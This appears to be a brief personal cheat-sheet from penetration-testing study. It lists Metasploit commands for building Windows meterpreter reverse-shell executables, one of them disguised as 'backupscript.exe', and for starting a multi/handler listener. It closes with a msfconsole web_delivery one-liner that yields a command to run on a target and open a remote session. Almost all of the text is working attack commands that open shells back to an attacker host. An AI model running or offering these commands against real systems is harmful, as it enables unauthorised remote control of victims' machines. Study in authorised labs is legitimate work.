msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
  
if you need a listener
- use exploit/multi/handler
  
if doing it from a webshell
```JavaScript
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> -f exe -o backupscript.exe LPORT=<port>
```
- set payload in multi/handler to “payload/windows/x64/meterpreter/reverse_https”
  
if you want to run powershell commands once you are in the reverse shell, make sure to run powershell.exe
  
  
```JavaScript
msfconsole -q -x "use exploit/multi/script/web_delivery ; set payload windows/x64/meterpreter/reverse_tcp ; set LHOST tun0 ; set LPORT 443 ; set target 2 ; exploit -j"
```
- this will give you the command to run on the target server
![image 237.png](/image%20237.png)
- running the command given on the remote system will give you a new meterpreter session
![image 1 171.png](/image%201%20171.png)
![image 2 148.png](/image%202%20148.png)